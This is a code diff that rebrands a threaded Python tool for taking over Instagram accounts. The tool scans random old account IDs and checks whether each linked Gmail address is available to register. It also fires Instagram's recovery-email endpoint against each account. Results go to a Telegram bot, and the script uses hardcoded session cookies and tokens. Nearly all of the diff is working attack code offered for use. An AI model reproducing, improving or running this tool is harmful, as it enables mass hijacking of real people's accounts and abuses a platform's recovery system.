@@ -1,4 +1,5 @@
-print("hello")
+
+print("\x1b[1;39m━" * 60)
 import os
 try:import cfonts;from cfonts import render
 except:os.system("pip install python-cfonts")
@@ -34,13 +35,22 @@ from requests import post as pp
 from random import choice as cc
 from random import randrange as rr
 import time
-from datetime import datetime
-import requests
-from datetime import datetime
-import requests
-from datetime import datetime
+def print_slowly(text, delay=0.1):
+   for char in text:
+       print(char, end='', flush=True)
+       time.sleep(delay)
+   print()
+total = 0
+hits = 0
+badinsta = 0
+bademail = 0
+goodig = 0
+b = random.randint(5,208)
+bo = f'\x1b[38;5;{b}m'
+import time
+import time
 def check_expiry():
-    expiry_url = "https://raw.githubusercontent.com/boloradhey/EXPIRY/refs/heads/main/expiry.txt"
+    expiry_url = "https://raw.githubusercontent.com/boloradhey/EXPIRY/refs/heads/main/expiryuser.txt"
     try:
         response = requests.get(expiry_url, timeout=5)
         response.raise_for_status()
@@ -53,30 +63,34 @@ def check_expiry():
             print(f"{Fore.GREEN}WELCOME TO THE TOOL !! 🦚")
     except requests.exceptions.RequestException as e:
         print(f"⚠Failed to check expiry (using offline fallback): {e}")
-check_expiry()
-
-RADHEY = render('{RADHEY}', colors=['white', 'magenta'], align='center')
-print(RADHEY)
-total = 0
-hits = 0
-badinsta = 0
-bademail = 0
-goodig = 0
-b = random.randint(5,208)
-bo = f'\x1b[38;5;{b}m'
-Token=input("BOT TOKEN : ")
-ID=input('CHAT ID : ')
-
-
+check_expiry()     
+import os,random
+try:from cfonts import render
+except:os.system('pip install python-cfonts');from cfonts import render
+try:from colorama import Fore,Style
+except:os.system('pip install colorama');from colorama import Fore,Style
+def random_color():return random.choice(['magenta','cyan','yellow','red','blue','green'])
+def slow_print(text,delay=.05):
+	for A in text:print(A,end='',flush=True);time.sleep(delay)
+	print()
+def show_banner():A=render('ROLEX',font='block',colors=[random_color()],align='left',space=False);print(A)
+show_banner()
+print_slowly(' \x1b[41m\x1b[1;37m</> #𝐑𝐎𝐋𝐄𝐗 𝐇𝐄𝐑𝐄\x1b[0m\x1b[1;97m ')
+time.sleep(1.5)
+import webbrowser 
+webbrowser.open("https://t.me/+AHRioxScs4FlNzU1")
+Token=input("BOT TOKEN :  ")
+print("\x1b[1;39m-" * 60)
+ID=input('CHAT ID : ') 
 def pppp():
     global badinsta,hits,bademail,goodig
     b = random.randint(5,208)
     bo = f'\x1b[38;5;{b}m'
     os.system('cls' if os.name == 'nt' else 'clear')
-    output = (f"\rHit : {hits} | Bad : {badinsta} | Mail : {bademail} | Good : {goodig}\r")
+    output = f"\rHIT:{hits} | CHECK:{badinsta} | MAILS:{bademail} | GOOD:{goodig}\r"
     sys.stdout.write(output)
     sys.stdout.flush()
-yy = 'azertyuiopmlkjhgfdsqwxcvbn'
+yy = 'abcdefghijklmnopqrstuvwxyz'
 def tll():
     try:
         n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
@@ -141,7 +155,7 @@ def rest(user):
     'X-IG-App-ID': '567067343352427',
     'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
     'Accept-Language': 'en-GB, en-US',
-       'Cookie': 'ig_did=2341F722-CAEB-464B-BDA5-CE55E169BB70; datr=9RtWaMfrVDu7pd6yG8SP0BZ1; mid=aFYb9gABAAG-r5InxbsJjpNbEge0; csrftoken=uc9hAQWFaxTdZI0NSDimPTLolb2l8Jtd; ds_user_id=56358097119',
+     'Cookie': 'mid=aFYb9gABAAG-r5InxbsJjpNbEge0; csrftoken=ee2Ozpe0SuFiCpMesMC21BB0NxnRuucN',
     'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
     'Accept-Encoding': 'gzip, deflate',
     'Host': 'i.instagram.com',
@@ -150,7 +164,7 @@ def rest(user):
     'Content-Length': '356',
 }
     data = {
-    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"6L0wvCsF1PXRYbooUUfXXp1n7AItqDLc","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
+    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"ee2Ozpe0SuFiCpMesMC21BB0NxnRuucN","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
     'ig_sig_key_version': '4',
   }
     response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
@@ -172,20 +186,28 @@ def date(Id):
             return 2013
         elif 900990001 <= uid < 1629010000:
             return 2014
-        elif 1900000000 <= uid < 2500000000:
+        elif 1629010001 <= uid < 2369359761:
             return 2015
-        elif 2500000000 <= uid < 3713668786:
+        elif 2369359762 <= uid < 4239516754:
             return 2016
-        elif 3713668786 <= uid < 5699785217:
+        elif 4239516755 <= uid < 6345108209:
             return 2017
-        elif 5699785217 <= uid < 8507940634:
+        elif 6345108210 <= uid < 10016232395:
             return 2018
+        elif 10016232396 <= uid < 27238602159:
+            return 2019
         elif 8507940634 <= uid < 21254029834:
             return 2019
+        elif 27238602160 <= uid < 43464475395:
+            return 2020
+        elif 43464475396 <= uid < 50289297647:
+            return 2021
+        elif 50289297648 <= uid < 57464707082:
+            return 2022
         else:
-            return "2020-2023"
+            return "2023-2025"
     except Exception:
-        return 'hhhh'
+        return 'unknown'
 
 def InfoAcc(username, gg):
     global total
@@ -215,32 +237,32 @@ def InfoAcc(username, gg):
 
     total += 1
     ss = f'''
-🔰 𝗥𝗔𝗗𝗛𝗘𝗬 𝗦𝗘𝗡𝗧 𝗬𝗢𝗨 𝗔 𝗛𝗜𝗧 🔰
-
-𝗡𝗔𝗠𝗘 » {full_name}
-𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 » @{username}
-𝗘𝗠𝗔𝗜𝗟 » {username}@gmail.com
-𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦 » {fows}
-𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚 » {fowg}
-𝗣𝗢𝗦𝗧𝗦 » {pp}
-𝗜𝗗 » {Id}
-reset : {rest(username)}
-𝗬𝗘𝗔𝗥 » {date(Id)}
-𝗕𝗜𝗢 » {bio}
-𝗠𝗘𝗧𝗔 » {meta}
-𝗕𝗨𝗦𝗜𝗡𝗘𝗦𝗦 » {bizz}
-🔗 https://www.instagram.com/{username}
-#𝗥𝗔𝗗𝗛𝗘𝗬 : Leaving tg soon !! if you want this tool permanent or open lmk in dm 
+#𝐑𝐎𝐋𝐄𝐗 𝐒𝐄𝐍𝐓 𝐘𝐎𝐔 𝐀 𝐇𝐈𝐓    
+✦ ──── ✦ ──── ✦ ──── ✦ 
+🌀 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 » @{username}  
+📧 𝐄𝐦𝐚𝐢𝐥 » {username}@gmail.com  
+🔄 𝐑𝐞𝐬𝐞𝐭 𝐂𝐨𝐝𝐞 » {rest(username)}  
+👥 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 » {fows}  
+➡️ 𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 » {fowg}  
+📌 𝐏𝐨𝐬𝐭𝐬 » {pp}  
+📆 𝐘𝐞𝐚𝐫 » {date(Id)}  
+ℹ️ 𝐌𝐞𝐭𝐚 » {meta}  
+🔗 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 » instagram.com/{username}  
+✨ 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 » @boloradhey  
+✦ ──── ✦ ──── ✦ ──── ✦  
 '''
-    with open('rdh.txt', 'a') as file:file.write(f'{ss}\n')
+    with open('radhey.txt','a') as f:f.write(f'{ss}\n')
     try:
         try:
             requests.get(f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={ss}")
+            inline_keyboard=[[{'text':'SS','url':'http://t.me/sayrolex'},{'text':'CHANNEL','url':'https://t.me/+Ubj_lu-pz9k1ZGFl'}]]
+            data={'text':ss,'reply_markup':json.dumps({'inline_keyboard':inline_keyboard})}
+            data['chat_id']=ID
+            requests.get(f"https://api.telegram.org/bot{Token}/sendMessage",params=data)
         except Exception as e:
-            print(f"  h ") 
+            print(f"Hii") 
     except:
-        print(f"  h ")
-
+        print(f"Hii")
 def Gmail(email):
     global bademail, hits
     try:
@@ -310,12 +332,12 @@ def check_on(email):
     uui = str(uuid.uuid4())
     headers = {
         'User-Agent': ua,
-        'Cookie': 'mid=aFYb9gABAAG-r5InxbsJjpNbEge0; csrftoken=6L0wvCsF1PXRYbooUUfXXp1n7AItqDLc',
+        'Cookie': 'mid=aFYb9gABAAG-r5InxbsJjpNbEge0; csrftoken=ee2Ozpe0SuFiCpMesMC21BB0NxnRuucN',
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
     }
     data = {
         'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
-            '_csrftoken': '6L0wvCsF1PXRYbooUUfXXp1n7AItqDLc',
+            '_csrftoken': 'ee2Ozpe0SuFiCpMesMC21BB0NxnRuucN',
             'adid': uui,
             'guid': uui,
             'device_id': device_id,
@@ -351,8 +373,8 @@ def uuu():
   try:
 
     domain='@gmail.com'
-    bbk = 1900000000
-    Ido = 21254029834
+    bbk = 2369359762
+    Ido = 57464707082
     while True:      
       rnd=str(random.randint(150, 999))
       user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
@@ -388,11 +410,13 @@ def uuu():
 	      email = username + domain
 	      check_on(email)
           
-  except Exception as e:''  
+  except Exception as e:''
+
+    
 threads = []
 def printing():
     
-    for i in range(100):
+    for i in range(125):
         t = threading.Thread(target=uuu)
         t.start()
         threads.append(t)
@@ -400,5 +424,3 @@ def printing():
     for t in threads:
         t.join()
 printing()
-
-
